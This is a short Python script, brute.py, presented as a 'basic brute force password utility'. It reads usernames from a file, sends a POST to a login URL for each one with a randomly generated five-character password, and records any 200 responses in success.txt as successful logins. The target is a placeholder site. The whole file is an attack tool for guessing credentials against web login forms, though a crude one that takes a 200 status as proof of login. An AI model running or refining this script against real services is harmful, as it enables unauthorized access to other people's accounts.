import requests
import string
import random

##
#
#
# Basic Brute Force Password Utility
# brute.py
#
# TODO: use a range of random number of characters instead of a fixed length
##

# Generate random password
# length = number of random characters to use
def genPassword(length):
  characters = string.ascii_letters + string.digits + string.punctuation
  random_characters = ''.join(random.choice(characters) for _ in range(length))
  return random_characters

# Perform brute action
# url = the URL of the target using POST
# length = number of random characters to use for the password
def brute(url, length):
  # Usernames.txt is the local file to loop through
  with open('usernames.txt', 'r', encoding='utf-8') as file:
    for line in file:
      line = line.strip()
      password = genPassword(length)
      data = {
        'username': line,
        'password': password
      }
      # Uses a POST request against the login form
      r = requests.post(url, data=data)
      if r.status_code == 200:
        log = line + ': ' + password + '\n'
        # Upon successful login (200 OK), log it to a local file
        with open('success.txt', 'a', encoding='utf-8') as success:
          success.write(log)
      else:
        print(f"{line} unsuccessful")

# Execute brute action: <URL> <number of characters in password>
target = "https://www.something.com/login/doLogin"
brute(target, 5)